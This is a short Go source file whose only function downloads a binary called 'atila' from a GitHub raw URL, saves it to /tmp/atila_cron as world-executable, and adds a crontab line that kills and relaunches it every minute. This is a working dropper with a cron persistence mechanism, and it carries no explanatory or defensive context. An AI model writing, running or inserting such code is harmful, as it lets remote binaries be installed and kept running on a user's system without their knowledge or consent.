package main


import (


"net/http"
"io/ioutil" 
//"fmt"
"os"
"os/exec"
 
)




func cron(){


bin :=  http.Client{}
  
req , err_get := bin.Get("https://github.com/atilaadmin/atila/raw/refs/heads/master/bin/atila")
 
if err_get != nil { return }

atila_byte ,  err_rd := ioutil.ReadAll(req.Body)
  
if err_rd != nil { return }

os.WriteFile("/tmp/atila_cron" , atila_byte , 0777)


//save binary  in cron


cron_ := exec.Command("sh",  "-c" , "(crontab -l ;  echo  '* * * * * sh -c  pkill -9 atila_cron ;  /tmp/./atila_cron') | crontab -")

cron_.Run()
 



}
